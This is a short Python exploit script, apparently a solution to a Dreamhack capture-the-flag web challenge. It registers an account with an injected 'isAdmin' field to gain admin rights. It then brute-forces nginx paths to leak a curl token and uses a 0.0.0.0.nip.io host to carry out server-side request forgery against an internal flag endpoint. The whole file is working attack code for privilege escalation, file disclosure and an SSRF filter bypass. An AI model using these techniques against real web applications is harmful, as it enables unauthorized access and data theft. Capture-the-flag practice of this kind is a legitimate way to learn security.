import requests
import re

url = 'http://localhost:8001'
url = 'http://host3.dreamhack.games:12955/'
s = requests.Session()

# admin login
creds = {
    'username': 'hacked',
    'password': 'hacked',
    'isAdmin': 1
}

res = s.post(f'{url}/app/signup', data=creds)
res = s.post(f'{url}/app/login', data=creds)

assert 'admin page' in res.text.lower()
print("> Logged in")

# get x-curl-token
for i in range(256):
    print(f"Trying: {i}/{256}")

    path = f"/etc/nginx/{i:02x}/curl-token"
    
    res = s.get(f'{url}/{path}')

    if res.status_code == 200:
        token = re.findall(r'CURL_TOKEN=(.+)', res.text)[0].strip()
        print("> Token:", token)
        
        s.cookies.update({ 'X-CURL-TOKEN': token })
        break

# ssrf
scheme = 'http://'
host = '0.0.0.0.nip.io'
port = '8002'
path = '/app/flag'

res = s.post(f'{url}/app/admin', data={
    'scheme': scheme,
    'host': host,
    'port': port,
    'path': path
})

flag = re.findall(r'(DH{.+?})', res.text)[0].strip()
print("Flag:", flag)